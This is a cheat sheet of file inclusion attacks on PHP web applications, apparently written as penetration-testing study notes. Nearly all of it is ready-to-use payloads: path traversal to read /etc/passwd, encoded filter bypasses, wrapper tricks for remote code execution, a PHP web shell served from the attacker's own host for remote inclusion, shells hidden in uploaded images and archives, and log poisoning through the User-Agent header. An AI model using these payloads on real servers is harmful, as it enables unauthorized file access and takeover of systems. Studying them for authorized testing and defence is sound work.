# File Inclusion (LFI / RFI)

Goal: Read local files or achieve RCE.

---

# Basic LFI

/index.php?language=/etc/passwd

/index.php?language=../../../../etc/passwd

/index.php?language=/../../../etc/passwd

/index.php?language=./languages/../../../../etc/passwd

---

# Bypass Filters

/index.php?language=....//....//....//....//etc/passwd

/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64

/index.php?language=../../../../etc/passwd%00

/index.php?language=php://filter/read=convert.base64-encode/resource=config

---

# RCE via Wrappers

/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"

curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"

---

# RFI

echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>

/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

---

# LFI + Upload

echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

/index.php?language=./profile_images/shell.gif&cmd=id

echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

/index.php?language=zip://shell.zip%23shell.php&cmd=id

php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

---

# Log Poisoning

/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'

/index.php?language=/var/log/apache2/access.log&cmd=id

---

# Tactical Notes

- Always try LFI first.
- Use wrappers for RCE.
- Attempt upload + include.
- Log poisoning is powerful.
